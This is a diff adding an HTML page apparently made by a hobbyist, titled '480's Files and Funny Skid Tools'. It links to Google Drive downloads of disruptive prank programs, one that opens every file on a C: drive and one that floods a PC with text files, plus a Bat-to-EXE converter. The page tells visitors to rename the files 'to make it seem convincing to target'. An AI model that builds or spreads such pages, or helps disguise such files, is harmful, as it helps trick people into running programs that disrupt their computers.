@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dark Themed Website</title>
+  <style>
+    /* Resetting some default styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      text-align: center;
+      padding: 30px;
+      background-color: #1d1d1d;
+      border-radius: 15px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+    }
+
+    h1 {
+      font-size: 36px;
+      margin-bottom: 20px;
+      color: #ffcc00;
+    }
+
+    p {
+      font-size: 18px;
+      margin-bottom: 30px;
+    }
+
+    .button {
+      background-color: #ffcc00;
+      color: #121212;
+      font-size: 18px;
+      padding: 12px 30px;
+      margin: 10px;
+      text-decoration: none;
+      border-radius: 25px;
+      display: inline-block;
+      transition: background-color 0.3s, transform 0.3s;
+    }
+
+    .button:hover {
+      background-color: #e6b800;
+      transform: scale(1.05);
+    }
+
+    .button:active {
+      transform: scale(1);
+    }
+
+    /* Style for multiple buttons */
+    .button-container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 15px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h1>480's Files and Funny Skid Tools</h1>
+    <p>Rename any of these to make it seem convincing to target lol</p>
+    <div class="button-container">
+      <a href="https://drive.google.com/file/d/1xkTu26GUiXa6cSz-YpKPvYpjo1PgVT9U/view?usp=sharing" class="button">Opens
+        all files in C: drive (trolling)</a>
+      <a href="https://drive.google.com/file/d/17HtNXYRrF5_iTbQgnDM84bGt5qrvZGaB/view?usp=sharing" class="button">Bat to
+        EXE converter (not by me)</a>
+      <a href="https://drive.google.com/file/d/1L2RNWXI631iUVZNNOY-WcK2I5erLozsP/view?usp=sharing" class="button">opens
+        tons of txt files on someones pc</a>
+      <a href="https://www.example4.com" class="button">Go to Example 4</a>
+      <a href="https://www.example5.com" class="button">Go to Example 5</a>
+      <a href="https://www.example6.com" class="button">Go to Example 6</a>
+    </div>
+  </div>
+</body>
+
+</html>
